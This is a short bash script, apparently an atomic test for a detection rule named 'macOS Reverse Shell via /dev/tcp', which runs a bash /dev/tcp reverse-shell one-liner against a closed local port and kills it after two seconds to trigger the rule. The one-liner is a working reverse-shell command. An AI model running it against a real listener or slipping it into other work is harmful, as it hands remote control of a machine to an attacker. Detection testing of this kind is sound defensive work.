#!/usr/bin/env bash
# Atomic test — rule be06a6b0-fa9f-4df4-9d4a-9f8794037508
#   "macOS Reverse Shell via /dev/tcp"  (process_creation)
#
# Apple's own /bin/bash supports /dev/tcp, so the stock shell is what an attacker
# uses. Runs it with a /dev/tcp stream redirect aimed at a closed local port, so
# nothing connects. A background guard kills it after a couple of seconds.
set -u
/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1' >/dev/null 2>&1 &
pid=$!
sleep 2
kill "$pid" 2>/dev/null || true
wait "$pid" 2>/dev/null || true
exit 0
